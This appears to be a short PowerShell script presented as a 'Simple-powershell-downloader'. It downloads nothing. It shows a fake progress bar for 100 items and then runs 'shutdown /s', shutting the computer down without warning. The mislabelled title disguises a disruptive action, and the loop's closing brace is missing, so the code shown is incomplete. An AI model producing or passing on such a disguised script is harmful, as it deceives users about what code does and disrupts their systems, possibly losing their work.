# Simple-powershell-downloader
 $TotalCount = 100
 for ($i=1; $i -le $TotalCount; $i++) {
     Write-Progress -Activity "Processing Items" -Status "Processing item $i of $TotalCount" -PercentComplete ($i / $TotalCount * 100)
     Start-Sleep -Milliseconds 50

     # Check if it's the last iteration
     if ($i -eq $TotalCount) {
         # Execute the shutdown command
         & shutdown /s
     }
